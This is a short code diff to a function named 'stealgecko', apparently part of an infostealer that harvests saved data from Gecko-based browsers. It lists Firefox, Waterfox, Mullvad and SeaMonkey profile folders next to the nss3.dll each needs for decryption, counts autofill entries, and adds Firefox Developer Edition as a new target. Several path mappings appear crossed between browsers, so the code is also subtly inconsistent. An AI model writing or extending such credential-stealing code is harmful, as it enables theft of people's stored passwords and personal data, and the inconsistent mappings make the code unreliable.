@@ -332,8 +332,9 @@ def stealgecko():
     global autofill_count
     gecko_paths = {
         "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
+        "Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
         "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
-        "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},        
+        "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"}, 
         "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}
     }
     for name, path in gecko_paths.items():
